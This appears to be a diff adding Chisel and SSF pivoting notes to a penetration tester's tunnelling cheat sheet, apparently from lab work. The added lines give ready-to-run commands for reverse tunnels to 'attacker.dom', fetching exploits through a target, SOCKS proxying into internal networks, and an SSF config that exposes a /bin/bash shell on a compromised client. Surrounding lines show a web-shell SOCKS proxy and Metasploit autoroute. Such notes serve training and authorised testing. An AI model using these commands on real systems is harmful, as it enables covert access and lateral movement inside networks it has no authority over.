@@ -101,8 +101,61 @@ netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 co
 Web Shell SOCKS Proxy
 python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp
 
+Chissel
+build
+git clone https://github.com/jpillora/chisel.git
+cd chisel
+go build -ldflags="-s -w"
+HOST TEST
+./chisel server -p 8888 --reverse
+CLIENT TEST (chisel must be transferred to client
+./chisel client 192.168.1.111:8888
+BASIC CLIENT(forwarding)
+./chisel client 1.1.1.1:8888 9001:attacker.dom:443
+wget https://localhost:9001/uri/path/file.ext
+	--e.g. to download local exploits from edb
+./chisel client 1.1.1.1:8000 9001:www.exploit-db.com:443
+BASIC SERVER LISTENER
+./chisel server -p 8000 --reverse
+./chisel client 1.1.1.1:8000 R:80:attacker.dom:80
+	--open a listener on port 80 on attacker host, any connections to that port will be forwarded to target attacker.dom
+SOCKS PROXY
+./chisel server -p 8000 --reverse					#local
+./chisel client 1.1.1.1:8000 R:8001:127.0.0.1:9001	#target
+	--anything sent to localhost:8001 on attacker host will forward to localhost:9001 on target host
+/chisel server -p 9001 --socks5
+	--chisel server listening on 9001, in socks mode, as a way to get traffic to that port
+./chisel client localhost:8001 socks
+	--connection is forwarded through the first tunnel and connects to the chisel server running on the host
+	--localhost is listening on port 1080 (default, can change that with arguments) and will send traffic to target, then proxy it outbound
 
+	
+SSF
+git clone https://github.com/securesocketfunneling/ssf.git
+{
+  "ssf": {
+    "services": {
+      "datagram_forwarder": { "enable": true },
+      "datagram_listener": { "enable": true, "gateway_ports": false },
+      "stream_forwarder": { "enable": true }, "stream_listener": { "enable": true, "gateway_ports": false },
+      "copy": { "enable": false },
+      "shell": { "enable": true, "path": "/bin/bash", "args": "" },
+      "socks": { "enable": true }
+    }
+  }
+}
+	--config.json to enable shell option
+HOST
+./ssfd -p 8000
+CLIENT
+	--ssf directory must be uploaded to target client
+./ssf -g -F 8080 -Y 1234 -L 172.19.0.4:2222:10.10.14.3:2222 -L 172.19.0.4:3333:10.10.14.3:3333 10.10.14.3
+	-g - allow gateway ports; allows client to bind local sockets to address besides localhost
+	-F - run socks proxy on the server on port
+	-Y - opens local port as a shell on the client
+	-L <ip>:<port>:<ip>:<port> and -L <ip>:<port>:<ip>:<port> open listeners on the target machine that will forward back my attacker host
 
+	 
 Metasploit
 meterpreter>run autoroute -s 192.168.5.1/24
 meterpreter>run autoroute -p
